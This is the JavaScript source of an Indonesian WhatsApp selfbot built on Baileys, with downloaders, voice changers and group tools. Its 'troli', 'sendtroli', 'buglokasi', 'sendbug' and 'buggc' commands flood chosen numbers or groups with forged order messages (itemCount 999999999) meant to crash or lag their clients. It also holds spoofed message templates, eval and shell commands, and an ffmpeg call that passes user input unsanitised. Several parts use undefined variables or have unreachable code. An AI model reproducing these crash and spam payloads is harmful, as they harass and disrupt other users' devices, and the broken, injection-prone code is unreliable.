const {
WAConnection: _WAConnection,
MessageType,
Presence,
MessageOptions,
Mimetype,
MimetypeMap,
WALocationMessage,
WA_MESSAGE_STUB_TYPES,
ReconnectMode,
ProxyAgent,
GroupSettingChange,
ChatModification,
waChatKey,
mentionedJid,
WA_DEFAULT_EPHEMERAL
} = require("@adiwajshing/baileys")
const simple = require('./database/js/simple.js')
const WAConnection = simple.WAConnection(_WAConnection)
const { 
generateMessageID,
getGroupAdmins,
getRandom,
banner,
start,
success,
info
} = require('./database/js/functions.js')
const { 
color, 
bgcolor 
} = require('./database/js/color.js')
const {
spawn,
exec,
execSync 
} = require('child_process')
const { 
 EmojiAPI 
} = require('emoji-api')
const qrcode = require('qrcode-terminal')
const qrcod = require('qrcode')
const moment = require('moment-timezone')
const fs = require('fs')
const twitdl = require("twitter-url-direct")
const fbdl = require('fb-video-downloader');
const figlet = require('figlet')
const brainly = require('brainly-scraper')
const yts = require( 'yt-search')
const ytdl = require( 'ytdl-core')
const fetchh = require('node-fetch')
const ggs = require('google-it')
const googleImage = require('g-i-s')
const axios = require('axios')
const CFonts = require('cfonts')
const oes = require('os')
const emojidl = new EmojiAPI()
const request = require ('request')
const got = require('got')
const cheerio = require('cheerio')
const formData = require('form-data')
const vanz = require('./scraper.js')
const ID3Writer = require('browser-id3-writer')
const util = require('util')
const ffmpeg = require('fluent-ffmpeg')
const speed = require('performance-now')
const raApi = require('ra-api')
const ttdl = require('tiktok-scraper-without-watermark')
const phoneNumber = require('awesome-phonenumber')
const imgbb = require('imgbb-uploader')
const os = require('os')
const jam = moment.tz('Asia/Jakarta').format('HH:mm')

// Multi prefix ya
fromMe = false
off = true
charging = '-'
baterai = '-'
antidel = false
prefix = ''
reason = ''
caption = ':v'
fake = 'Ivanzz'
sessionName = Math.floor(Math.random() * 99999)
fakethumb =  fs.readFileSync(`./database/src/thumb/fake.jpg`)
thumb = fs.readFileSync(`./database/src/thumb/Ivan.jpg`)
uptime = process.uptime()
waktuof = process.uptime()
blocking = []

var ucapanW = 'By Ivanzz'
 if (jam >= '04:00' && jam <= '06:00') {
 ucapanW = 'Subuh!'
 } else if (jam >= '06:00' && jam <= '10:00') {
 ucapanW = 'Pagi!'
 } else if (jam >= '10:00' && jam <= '14:00') {
 ucapanW = 'Siang!'
 } else if (jam >= '14:00' && jam <= '17:00') {
 ucapanW = 'Sorre!'
 } else if (jam >= '17:00' && jam <= '17:30') {
 ucapanW = 'Petang!'
 } else if (jam >= '17:30' && jam <= '18:10') {
 ucapanW = 'Magrib!'
 } else if (jam >= '18:10' && jam <= '04:00') {
 ucapanW = 'Malam!'
 } else {
 ucapanW = 'Malam!'
 }
const d = new Date
const locale = 'id'
const gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
const weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
const week = d.toLocaleDateString(locale, { weekday: 'long' })
const calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
function kyun(seconds) {
function pad(s) {
return (s < 10 ? '0' : '') + s
}
var hours = Math.floor(seconds / (60 * 60))
var minutes = Math.floor(seconds % (60 * 60) / 60)
var seconds = Math.floor(seconds % 60)
return `${pad(hours)}:${pad(minutes)}:${pad(seconds)}`
}
async function starts() {
const Vanz = new WAConnection()
Vanz.version = [2, 2119, 6]
Vanz.logger.level = 'warn'
Vanz.on('qr', qr => {
qrcode.generate(qr, { small: true })
console.log(color('[','white'), color('!','red'), color(']','white'), color('Self Ivanzz','yellow'))
})
Vanz.on('credentials-updated', () => {
fs.writeFileSync('./qr.json', JSON.stringify(Vanz.base64EncodedAuthInfo(), null, '\t'))
info('2', 'Loading')
})
fs.existsSync('./qr.json') && Vanz.loadAuthInfo('./qr.json')
Vanz.on('connecting', () => {
start('2', 'Connecting')
})
Vanz.on('open', () => {
success('2', 'Connected ')
})
Vanz.connect({timeoutMs: 301000})

Vanz.on('CB:Blocklist', json => {
if (blocking.length > 2) return
for (let i of json[1].blocklist) {
blocking.push(i.replace('c.us', 's.whatsapp.net'))
}
})
Vanz.on('CB:action,,battery', json => {
global.batteryLevelStr = json[2][0][1].value
global.batterylevel = parseInt(batteryLevelStr)
baterai = batterylevel
if (json[2][0][1].live == 'true') charging = true
if (json[2][0][1].live == 'false') charging = false
})
Vanz.on('message-delete', async (m) => {
if (antidel === true) {
if (m.key.remoteJid == 'status@broadcast') return
if (m.key.fromMe) return
const moment = require('moment-timezone')
const jam = moment.tz('Asia/Jakarta').format('HH:mm:ss')
let d = new Date
let locale = 'id'
let gmt = new Date(0).getTime() - new Date('1 Januari 2021').getTime()
let weton = ['Pahing', 'Pon','Wage','Kliwon','Legi'][Math.floor(((d * 1) + gmt) / 84600000) % 5]
let week = d.toLocaleDateString(locale, { weekday: 'long' })
let calender = d.toLocaleDateString(locale, {
day: 'numeric',
month: 'long',
year: 'numeric'
})
Vanz.sendMessage(m.key.remoteJid, `ANTI DELETE
Nama : @${m.participant.split("@")[0]}
Waktu : ${jam} ${week} ${calender}
Type : ${Object.keys(m.message)[0]}`, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})

//Vanz.copyNForward(m.key.remoteJid, m.message)
}
})
Vanz.on('message-new', async(vnz) => {
try {
if (!vnz.message) return
if (vnz.key && vnz.key.remoteJid == 'status@broadcast') return 
 if (!vnz.message) return
if (vnz.key && vnz.key.remoteJid == 'status@broadcast') return
if(vnz.key.fromMe){
}
if (!fromMe) {
if (!vnz.key.fromMe) return
}
m = simple.smsg(Vanz, vnz)
Vanz.version = [2, 2119, 6]
global.prefix
global.blocking
vnz.message = (Object.keys(vnz.message)[0] === 'ephemeralMessage') ? vnz.message.ephemeralMessage.message : vnz.message
global.batrei = global.batrei ? global.batrei : []
Vanz.on('CB:action,,battery', json => {
const batteryLevelStr = json[2][0][1].value
const batterylevel = parseInt(batteryLevelStr)
global.batrei.push(batterylevel)
})
const battrey = global.batrei[global.batrei.length - 1]
var tampilan_battrey = `Belum Terdeteksi`
if (battrey >= '0' && battrey <= '10') {
tampilan_battrey = `${battrey}% [▓▒▒▒▒▒▒▒▒▒]`
} else if (battrey >= '10' && battrey <= '20') {
tampilan_battrey = `${battrey}% [▓▓▒▒▒▒▒▒▒▒▒]`
} else if (battrey >= '20' && battrey <= '30') {
tampilan_battrey = `${battrey}% [▓▓▓▒▒▒▒▒▒▒]`
} else if (battrey >= '30' && battrey <= '40') {
tampilan_battrey = `${battrey}% [▓▓▓▓▒▒▒▒▒▒]`
} else if (battrey >= '40' && battrey <= '50') {
tampilan_battrey = `${battrey}% [▓▓▓▓▓▒▒▒▒▒]`
} else if (battrey >= '50' && battrey <= '60') {
tampilan_battrey = `${battrey}% [▓▓▓▓▓▓▒▒▒▒]`
} else if (battrey >= '60' && battrey <= '70') {
tampilan_battrey = `${battrey}% [▓▓▓▓▓▓▓▒▒▒]`
} else if (battrey >= '70' && battrey <= '80') {
tampilan_battrey = `${battrey}% [▓▓▓▓▓▓▓▓▒▒]`
} else if (battrey >= '80' && battrey <= '90') {
tampilan_battrey = `${battrey}% [▓▓▓▓▓▓▓▓▓▒]`
} else if (battrey >= '90' && battrey <= '100') {
tampilan_battrey = `${battrey}% [▓▓▓▓▓▓▓▓▓▓]`
} else {
}
const content = JSON.stringify(vnz.message)
const from = vnz.key.remoteJid
const type = Object.keys(vnz.message)[0]
const { text, extendedText, contact, location, liveLocation, image, video, sticker, document, audio, product } = MessageType
const multi = (type === 'conversation' && vnz.message.conversation) ? vnz.message.conversation : (type == 'imageMessage') && vnz.message.imageMessage.caption ? vnz.message.imageMessage.caption : (type == 'videoMessage') && vnz.message.videoMessage.caption ? vnz.message.videoMessage.caption : (type == 'extendedTextMessage') && vnz.message.extendedTextMessage.text ? vnz.message.extendedTextMessage.text : ''.slice(1).trim().split(/ +/).shift().toLowerCase()
const prefix = /^[°zZ#$@*+,.?=''():√%!¢£¥€π¤ΠΦ_&><`™©®Δ^βα¦|/\\©^]/.test(multi) ? multi.match(/^[°zZ#$@*+,.?=''():√%¢£¥€π¤ΠΦ_&><!`™©®Δ^βα¦|/\\©^]/gi) : '-'
body = (type === 'conversation' && vnz.message.conversation.startsWith(prefix)) ? vnz.message.conversation : (type == 'imageMessage') && vnz.message.imageMessage.caption.startsWith(prefix) ? vnz.message.imageMessage.caption : (type == 'videoMessage') && vnz.message.videoMessage.caption.startsWith(prefix) ? vnz.message.videoMessage.caption : (type == 'extendedTextMessage') && vnz.message.extendedTextMessage.text.startsWith(prefix) ? vnz.message.extendedTextMessage.text : ''
bodi = (type === 'conversation') ? vnz.message.conversation : (type === 'extendedTextMessage') ? vnz.message.extendedTextMessage.text : ''
const tohex = Object.keys(vnz.message)[0] == "stickerMessage" ? vnz.message.stickerMessage.fileSha256.toString('hex') : ""

isStc = tohex

const isStcQ = isStc !== "" && content.includes("extendedTextMessage") ||
isStc !== "" && content.includes("conversation")
const isStcMedia = isStc !== "" && content.includes("quotedMessage") && !content.includes("extendedTextMessage") || isStc !== "" && content.includes("quotedMessage") && !content.includes("conversation")
const isStcVideo = isStcMedia && content.includes("videoMessage")
const isStcImage = isStcMedia && content.includes("imageMessage")
const isStcSticker = isStcMedia && content.includes("stickerMessage")
const isStcTeks = isStcMedia && content.includes("quotedMessage")
const isStcDocs = isStcMedia && content.includes("documentMessage")
const isStcContact = isStcMedia && content.includes("contactMessage")
const isStcAudio = isStcMedia && content.includes("audioMessage")
const isStcLoca = isStcMedia && content.includes("locationMessage")
const isStcTag = isStcMedia && content.includes("mentionedJid")
const isStcReply = isStcMedia && content.includes("Message")
const isStcProd = isStcMedia && content.includes("productMessage")
const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
const args = body.trim().split(/ +/).slice(1)
const isCmd = body.startsWith(prefix)
mess = {
wait: '⏳Wait sedang di prosess⏳',
sukses: 'Sukses !!',
error: 'Error!'
}
const ownerNumber = '628812904283@s.whatsapp.net'
const isGroup = from.endsWith('@g.us')
const sender = isGroup ? vnz.participant : vnz.key.remoteJid
const totalchat = await Vanz.chats.all()
const groupMetadata = isGroup ? await Vanz.groupMetadata(from) : ''
const groupName = isGroup ? groupMetadata.subject : ''
const groupId = isGroup ? groupMetadata.jid : ''
const groupMembers = isGroup ? groupMetadata.participants : ''
const groupDesc = isGroup ? groupMetadata.desc : ''
const groupOwner = isGroup ? groupMetadata.owner : ''
const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : ''
const conts = vnz.key.fromMe ? Vanz.user.jid : Vanz.contacts[sender] || { notify: jid.replace(/@.+/, '') }
const pushname = vnz.key.fromMe ? Vanz.user.name : conts.notify || conts.vname || conts.name || '-'
const off = '628812904283@s.whatsapp.net' 
const q = args.join(' ')

const reply = (teks) => {
Vanz.sendMessage(from, `${teks}`, text, { quoted: vnz, thumbnail: thumb})
}
const math = (teks) => {
return Math.floor(teks)
}
const sendIMG = (to, res) => {
Vanz.sendMessage(from, res, image, {quoted:vnz, caption: caption, thumbnail:thumb})
}
const sendSTC = (to, res) => {
Vanz.sendMessage(to, res, sticker, {quoted:vnz})
}
const sendVID = (to, res) => {
Vanz.sendMessage(to, res, video, {mimetype: 'video/mp4', quoted:vnz, caption:caption})
}
const sentTXT = (to, res) => {
Vanz.sendMessage(to, res, text)
}
const sendPTT = (res) => {
Vanz.sendMessage(from, res, audio, {mimetype: 'audio/mp4', ptt:true, quoted:vnz})
}
const sendStickUrl = async(from, url) => {
var names = Date.now() / 10000;
var download = function (uri, filename, callback) {
request.head(uri, function (err, res, body) {
request(uri).pipe(fs.createWriteStream(filename)).on('close', callback);
});
};
download(url, './database/sampah/' + names + '.png', async function () {
console.log('selesai');
let filess = './database/sampah/' + names + '.png'
let asw = './database/sampah/' + names + '.webp'
exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
let media = fs.readFileSync(asw)
Vanz.sendMessage(to, media, MessageType.sticker,{quoted:vnz})
fs.unlinkSync(filess)
fs.unlinkSync(asw)
});
});
}
const downloadM = async(save) => {
const isTagedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isTagedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
encmedia = isTagedImage ? JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : vnz
encmedia = isTagedVideo ? JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo : vnz
encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
if (save) return await Vanz.downloadAndSaveMediaMessage(encmedia)
return await Vanz.downloadMediaMessage(encmedia)
}
const sendFile = async(link, type, options) => {
hasil = await getBuffer(link)
Vanz.sendMessage(from, hasil, type, options).catch(e => {
fetchh(link).then((hasil) => {
Vanz.sendMessage(from, hasil, type, options).catch(e => {
Vanz.sendMessage(from, { url : link }, type, options).catch(e => {
reply('Error!')
console.log(e)
})
})
})
})
}
if (body.startsWith('$')) {
if (!vnz.key.fromMe) return
exec(q, (err, stdout) => {
if(err) return reply(`${err}`)
if (stdout) {
reply(stdout)
}
})
}
if (body.startsWith('>>')) {
return Vanz.sendMessage(from, JSON.stringify(eval(q),null,'\t'),text, {quoted: vnz})
}
if (body.startsWith('=>')) {
if (!vnz.key.fromMe) return 
run = q
return eval(run)
}
if (body.startsWith('>')) {
if (!vnz.key.fromMe) return
try {
function Res(res) {
ev = JSON.stringify(res, null, 2)
al = util.format(ev)
if (ev == undefined){
al = util.format(ev)
}
return reply(`${al}`)
}
reply(util.format(eval(`(async () => { ${q} })()`)))
} catch(e) {
emror = String(e)
reply(`${emror}`)
}
}
if (m.message && m.isBaileys && m.quoted && m.quoted.mtype === 'orderMessage' && !(m.quoted.token && m.quoted.orderId)) {
reply('Njir Troli 🗿\n\n' + require('util').format(m.key))
await Vanz.modifyChat(m.chat, 'delete', {
 includeStarred: false
})
}
offlen = `${kyun(waktuof)}`
if (!vnz.key.fromMe && isGroup && off == false) {
if (bodi.includes(`@${ownerNumber}`)) {
Vanz.sendMessage(from, `* Mohon Maaf @${ownerNumber.split('@')[0]} Sedang Offline!*
*• Alasan:* ${reason}
*• Sejak:* ${offlen}`, text, {quoted:vnz, contextInfo: { mentionedJid: [ownerNumber]}})
}
}
const faketoko = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {})
},
message: {
'productMessage': {
'product': {
'productImage':{
'mimetype': 'image/jpeg',
'jpegThumbnail': thumb
},
'title': prefix + command,
'description': '',
'currencyCode': 'IDR',
'priceAmount1000': '1',
'retailerId': 'Self Bot',
'productImageCount': 0
},
'businessOwnerJid': `0@s.whatsapp.net`
}
}
}
const fakeinvite = {
"key": {
"fromMe": false,
"participant": "0@s.whatsapp.net",
"remoteJid": "0@s.whatsapp.net"
},
"message": {
"groupInviteMessage": {
"groupJid": '6285737134572-1612303415@g.us',
"inviteCode": "mememteeeekkeke",
"groupName": from, 
"caption": `:  ${prefix + command}`, 
'jpegThumbnail': thumb
}
}
}
const faketroli = {
key: {
fromMe: false,
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: 'status@broadcast' } : {})
},
message: { 
orderMessage: {
itemCount: 1,
status: 200, 
surface: 200,
message: fake,
orderTitle: '', 
thumbnail: thumb,
sellerJid: '0@s.whatsapp.net'
}
}
}
const mentions = (teks, memberr, id) => {
(id == null || id == undefined || id == false) ? Vanz.sendMessage(from, teks.trim(), extendedText, { contextInfo: { 'mentionedJid': memberr } }) : Vanz.sendMessage(from, teks.trim(), extendedText, { quoted:vnz, contextInfo: { 'mentionedJid': memberr } })
}

module.exports = getBuffer = async (url, options) => {
options ? options : {}
 res = await axios({
method: "get",
url,
headers: {
'DNT': 1,
'Upgrade-Insecure-Request': 1
},
...options,
responseType: 'arraybuffer'
})
return res.data
}
module.exports = exifCreate = (packname1, authorname1, filename) => {
if (!filename) filename = 'data'
 json = {
'sticker-pack-id': 'com.snowcorp.stickerly.android.stickercontentprovider b5e7275f-f1de-4137-961f-57becfad34f2',
'sticker-pack-name': packname1,
'sticker-pack-publisher': authorname1,
'android-app-store-link': 'https://play.google.com/store/apps/details?id=com.pubg.newstate&hl=in&gl=US',
'ios-app-store-link': 'https://apps.apple.com/us/app/pubg-mobile-3rd-anniversary/id1330123889'
}
let len = JSON.stringify(json).length
const f = Buffer.from([0x49, 0x49, 0x2A, 0x00, 0x08, 0x00, 0x00, 0x00, 0x01, 0x00, 0x41, 0x57, 0x07, 0x00])
const code = [0x00, 0x00, 0x16, 0x00, 0x00, 0x00]
if (len > 256) {
len = len - 256
code.unshift(0x01)
} else {
code.unshift(0x00)
}
const fff = Buffer.from(code)
const ffff = Buffer.from(JSON.stringify(json))
if (len < 16) {
len = len.toString(16)
len = '0' + len
} else {
len = len.toString(16)
}
const ff = Buffer.from(len, 'hex')
const buffer = Buffer.concat([f, ff, fff, ffff])
fs.writeFile(`./database/sampah/${filename}.exif`, buffer, (err) => {
if (err) return console.error(err)
console.log('Success!')
})
}

function troli(nomor){
Vanz.sendMessage(nomor, `Punten !!!`, MessageType.extendedText,{
 quoted: {
key: {
participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {})
 },
message: {
orderMessage: {
itemCount: 999999999, 
status: 1,
surface: 10,
orderTitle: 'TROLI', 
sellerJid: '0@s.whatsapp.net'
}
}
}
})
}
colors = ['red', 'white', 'black', 'blue', 'yellow', 'green']
const isMedia = (type === 'imageMessage' || type === 'videoMessage' || type === 'audioMessage')
const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
let waktu = moment.tz('Asia/Jakarta').format('MM/DD HH:mm')
if (!isCmd) console.log(color('\x1b[1;37m>', 'cyan'), color('[MSG]'), color(waktu, 'cyan'), color('Message', 'red'), 'Dari', color(pushname))
if (isCmd) console.log(color('\x1b[1;37m>', 'cyan'), color('[CMD]'), color(waktu, 'cyan'), color(command + ` [${[args.length]}]` ), 'Dari', color(pushname))

switch (command) {
case 'help':
case 'h':
case 'menu':
menu = ` *SIMPEL-SELFBOT*

*INFO*
• cekprefix
• ${prefix}stats
• ${prefix}runtime
• ${prefix}owner
• ${prefix}speed
• ${prefix}listgroup
• ${prefix}uptime

*Downloader*
• ${prefix}ytmp3 *link*
• ${prefix}ytmp4 *link*
• ${prefix}play *query*
• ${prefix}playmp4 *query*
• ${prefix}fb *link*
• ${prefix}tiktok *link*
• ${prefix}tiktokmusic *link*
• ${prefix}ig *link*

*Stalker*
• ${prefix}igstalk *username*
• ${prefix}ghstalk *username*

*Converter*
• ${prefix}stiker 
• ${prefix}swm nama|author
• ${prefix}take nama|author
• ${prefix}colong
• ${prefix}tomp4
• ${prefix}tomp3
• ${prefix}imgtotext
• ${prefix}toimg

*Group*
• ${prefix}grup *buka/tutup*
• ${prefix}setgcname *txt*
• ${prefix}setgcdesk *txt*
• ${prefix}add *628xx*
• ${prefix}kick *@tag/reply*
• ${prefix}getpic *@tag*
• ${prefix}promote 
• ${prefix}demote 
• ${prefix}hidetag *txt*
• ${prefix}tagall 

*Voice Changer*
• ${prefix}bass 
• ${prefix}tempo 
• ${prefix}vibra 
• ${prefix}gemes
• ${prefix}trigger 
• ${prefix}nightcore
• ${prefix}balik
• ${prefix}volume 
• ${prefix}hode 
• ${prefix}imut 
• ${prefix}robot
• ${prefix}budeg

*Owner*
• ${prefix}join *link*
• ${prefix}bc *txt*
• ${prefix}shutdown
• ${prefix}restart 
• > *eval*
• $ *exec*`
reply(menu)
break
case 'stats':
 if (!vnz.key.fromMe) return only('Command Khusus Owner !!')
var groups = Vanz.chats.array.filter(v => v.jid.endsWith('g.us'))
var privat = Vanz.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
var ram2 = `${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB`
	uptime = process.uptime();
timestamp = speed();
totalChat = await Vanz.chats.all()
charge = charging ? 'true' : 'false'
listrik = charging ? '⚡' : ''
latensi = speed() - timestamp
	var total = math(`${groups.length}*${privat.length}`)
	teks = `*Bot Stats*
• Group Chats : ${groups.length}
• Private Chats : ${privat.length}
• Total Chats : ${totalChat.length}
• Speed : ${latensi.toFixed(4)} Second
• Runtime : ${kyun(uptime)}

*Phone Stats*
• Baterai : ${JSON.stringify(baterai)}%${listrik}
• Penggunaan Ram : ${ram2}
• Platform : ${os.platform()}
• Hostname : ${os.hostname()}
• Uptime : ${kyun(os.uptime())}
• Wa Version: ${Vanz.user.phone.wa_version}
• Os Version: ${Vanz.user.phone.os_version}
• Device Model: ${Vanz.user.phone.device_model}`
reply(`${teks}`)
break
case 'ultah':
 qq = q

 zodiakk = [
["Capricorn", new Date(1970, 0, 1)],
["Aquarius", new Date(1970, 0, 20)],
["Pisces", new Date(1970, 1, 19)],
["Aries", new Date(1970, 2, 21)],
["Taurus", new Date(1970, 3, 21)],
["Gemini", new Date(1970, 4, 21)],
["Cancer", new Date(1970, 5, 22)],
["Leo", new Date(1970, 6, 23)],
["Virgo", new Date(1970, 7, 23)],
["Libra", new Date(1970, 8, 23)],
["Scorpio", new Date(1970, 9, 23)],
["Sagittarius", new Date(1970, 10, 22)],
["Capricorn", new Date(1970, 11, 22)]
].reverse()

function getZodiac(month, day) {
 dey = new Date(1970, month - 1, day)
return zodiakk.find(([_,_d]) => dey >= _d)[0]
}
 dateek = new Date(qq)
if (dateek == 'Invalid Date') throw dateek
let dd = new Date()
 let [tahun, bulan, tanggal] = [dd.getFullYear(), dd.getMonth() + 1, dd.getDate()]
 birth = [dateek.getFullYear(), dateek.getMonth() + 1, dateek.getDate()]

 zodiackk = getZodiac(birth[1], birth[2])
 ageD = new Date(d - dateek)
 agek = ageD.getFullYear() - new Date(1970, 0, 1).getFullYear()

 birthday = [tahun + (birth[1] < bulan), ...birth.slice(1)]
 cekusia = bulan === birth[1] && tanggal === birth[2] ? `Selamat ulang tahun yang ke-${agek} 🥳` : agek

 tekss = `
Lahir : ${birth.join('-')}
Ultah Mendatang : ${birthday.join('-')}
Usia : ${cekusia}
Zodiak : ${zodiackk}
`.trim()
reply(tekss)
break
case 'runtime':
reply(kyun(uptime))
break
case 'owner':
vanz.sendContact(from, '628812904283', 'Ivanzz', {quoted: vnz})
break
case 'speed':
reply(`• Speed : ${latensi.toFixed(4)} Second`)
break
case 'uptime':
reply(`• Uptime : ${kyun(os.uptime())}`)
case 'balik':
	encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await Vanz.downloadAndSaveMediaMessage(encmedia)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} -filter_complex "areverse" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
	})
break
case 'volume':
	encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await Vanz.downloadAndSaveMediaMessage(encmedia)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} -filter:a "volume=${args[0]}" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
	})
break
case 'budeg':
	encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await Vanz.downloadAndSaveMediaMessage(encmedia)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} -filter:a "volume=50" ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
	})
break
case 'imut':
	encmedia = JSON.parse(JSON.stringify(vnz).replace('quotedM','m')).message.extendedTextMessage.contextInfo
	media = await Vanz.downloadAndSaveMediaMessage(encmedia)
	ran = getRandom('.mp3')
	exec(`ffmpeg -i ${media} -af atempo=1/2,asetrate=44500*2/1 ${ran}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
res = fs.readFileSync(ran)
sendPTT(res)
fs.unlinkSync(ran)
	})
break
anu = from
if (`${anu}@g.us`) {
try {
	ppimg = await Vanz.getProfilePicture(anu)
} catch {
	ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
}
metadete = await Vanz.groupMetadata(anu)
ano = await Vanz.getProfilePicture(anu)
buffer = await getBuffer(ano)
Vanz.sendMessage(from, buffer, image, {quoted: floc, caption: `Done!!`})
} else {
}
break
case 'getpic':
pp = await Vanz.getProfilePicture(vnz.quoted)
sendFile(pp, image,{thumbnail:thumb})
break
case "31e4df825f9a7e8b731f7a72c0992312be5a8d939f222bacb901890c03a7890a":
reply('Tunggu Sebentar...')
jdl = vnz.message.stickerMessage.contextInfo.quotedMessage.conversation
 anu = await yts(jdl);
anul = anu.all;
 yy = anul[0].title
 dl = ytdl(anul[0].videoId, {
quality: 'highestaudio',
});
ffmpeg(dl)
.audioBitrate(320)
.save('./database/sampah/' + yy + '.mp3')
.on('end', async () => {
saveMedia = new ID3Writer(fs.readFileSync('./database/sampah/' + yy + '.mp3'));
await Vanz.sendMessage(from, Buffer.from(saveMedia.arrayBuffer), audio, {mimetype: Mimetype.mp4Audio, ptt: true, quoted: vnz});
fs.unlinkSync('./database/sampah/' + yy + '.mp3')
});
break
case 'play': case 'ytplay': case 'ytmp3':
 ytsnya = await yts(q);
res = ytsnya.all;
anu = await vanz.yta(res[0].url)
bup = await getBuffer(anu.audio)
Vanz.sendMessage(from, bup, audio, {mimetype: 'audio/mp4', quoted:vnz})
break
case 'video': case 'playmp4': 
 ytsnya = await yts(q);
res = ytsnya.all;
anu = await vanz.ytv(res[0].url)
bup = await getBuffer(anu.dl_link)
Vanz.sendMessage(from, bup, video, {quoted:vnz})
break
case 'getmusic': case 'getytmusic':
namLagu = 'Y'
ffmpeg(q)
.audioBitrate(320)
.save('./database/sampah/' + namLagu + '.mp3')
.on('end', async () => {
saveMedia = new ID3Writer(fs.readFileSync('./database/sampah/' + namLagu + '.mp3'));
await Vanz.sendMessage(from, Buffer.from(saveMedia.arrayBuffer), audio, {mimetype: Mimetype.mp4Audio, ptt: true, quoted: vnz});
fs.unlinkSync('./database/sampah/' + namLagu + '.mp3')
});
break
case 'video2':
let ytsny = await yts(q);
ytsny = ytsny.all;
var yt = ytdl(ytsny[0].videoId, {filter: format => format.container === 'mp4' && ['720p', '480p', '360p', '240p', '144p'].map(() => true)});
yt.pipe(fs.createWriteStream('./' + ytsny[0].title + '.mp4'));
yt.on('end', async () => {
await Vanz.sendMessage(from, fs.readFileSync('./' + ytsny[0].title + '.mp4'), video, {mimetype: Mimetype.mp4, quoted: vnz});
fs.unlinkSync('./' + ytsny[0].title + '.mp4')
});
break
case 'join':
if (args.length < 1) return reply('Link nya mana?')
Vanz.query({
json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
reply(`${json}`)
break
case 'offline':
if (args.length < 1) return reply('Alasanya apa?')
if (off === false) return
off = false
reason = q
waktuoff = `${jam}`
Vanz.sendMessage(from, `* OFFLINE*
*• Alasan :* ${reason}
*• Waktu :* ${waktuoff}`, text, { contextInfo: {mentionedJid: [sender]}, quoted:vnz})
break
case 'sendbug': case 'sendbuggc':
hm = `${q}`
hmm = hm.split("|")[0];
hmmm = hm.split("|")[1];
for (let i = 0; i < hmmm; i++) {
await Vanz.toggleDisappearingMessages(hmm, 0)
reply(`Sukses SendBuggc ke ${hm}`)
}
break
case 'buggc':
for (let i = 0; i < args[0]; i++) {
await Vanz.toggleDisappearingMessages(from, 0)
reply(`Sukses SendBugg`)
}
break
case 'buglokasi':
Vanz.sendMessage(from, {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:'Troli By Ivanzz',address:'Puntenn !!'}, MessageType.location, {quoted:BugTroli})
break
case 'sendtroli':
hm = `${q}`
hmm = hm.split("|")[0];
hmmm = hm.split("|")[1];
for (let i = 0; i < hmmm; i++) {
await troli(hmm + '@s.whatsapp.net', 0)
}
reply(`Sukses Send Troli ke ${mhm}`)
break
case 'troli':
for (let i = 0; i < args[0]; i++) {
troli(from, 0)
}
reply('Sukses')
break
case 'online':
bacChat = true
reply('Online')
break
case 'mediafire': case 'mfire':
reply(Wait)
 query = await axios.get(q) 
cher = cheerio.load(query.data)
 hasil = []
 link = cher('a#downloadButton').attr('href')
size = cher('a#downloadButton').text().replace('Download', '').replace('(', '').replace(')', '').replace('\n', '').replace('\n', '').replace('                         ', '')
 split = link.split('/')
 aurhor = 'Ivanzz'
 nama = seplit[5]
 mime = nama.split('.')
mime = mime[1]
hasil.push({ author, nama, mime, size, link })
return hasil
sendFile(res[0].link, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: vnz})
break
case 'yts': case 'ytsearch':
if (args.length < 1) return reply('Yang mau di cari apaan?')
teks = q
res = await yts(`${teks}`)
kant = ``
for (let i of res.all) {
kant += `* Yt Search*
*• Judul :* ${i.title}
*• Views :* ${i.views}
*• Di Upload Pada :* ${i.ago}
*• Durasi :* ${i.timestamp}
*• Channel :* ${i.author.name}
*• Link Channel :* ${i.author.url}
